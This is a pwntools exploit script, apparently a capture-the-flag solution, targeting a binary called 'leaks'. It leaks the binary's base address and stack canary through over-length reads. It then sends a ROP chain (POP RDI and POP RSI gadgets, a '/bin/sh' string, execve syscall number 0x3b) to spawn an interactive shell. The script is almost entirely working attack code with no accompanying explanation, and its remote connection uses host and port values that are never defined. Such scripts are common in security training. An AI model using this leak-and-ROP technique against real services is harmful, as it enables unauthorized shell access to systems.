from pwn import *

elf = context.binary = ELF('./leaks')
libc = ELF('./libc.so.6')

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()
p.recvuntil('You hear that, Mr. Anderson? That\'s the sound of inevitability, that\'s the sound of your death, goodbye, Mr. Anderson.\n')
p.sendline(str(8))
p.sendline('/bin/sh\x00')

# Leak binary base
p.sendline(str(8))
p.sendline('A' * 8)
p.recvline()

_start = u64(('\x00' + p.recvline()[0:5]).ljust(8, '\x00'))


log.info('_start leak: {}'.format(hex(_start)))
binary_base = _start - elf.sym['_start']
log.info('Base: {}'.format(hex(binary_base)))

# Leak canary
p.sendline(str(24))
p.sendline('A' * 24)
p.recvline()
canary = u64(('\x00' + p.recvline()[0:7]).ljust(8, '\x00'))
log.info('Canary: {}'.format(hex(canary)))

name = p64(binary_base + elf.sym['name'])
yay = p64(binary_base + elf.sym['yay'])
POP_RDI = p64(binary_base + 0x00000000000013f3)
POP_RSI_R15 = p64(binary_base + 0x00000000000013f1)

# get shell
payload = 'A' * 24 + p64(canary) + p64(0x3b) + POP_RDI + name + POP_RSI_R15 + p64(0) + p64(0) + yay
p.sendline(str(len(payload)))
p.sendline(payload)
p.interactive()
p.close()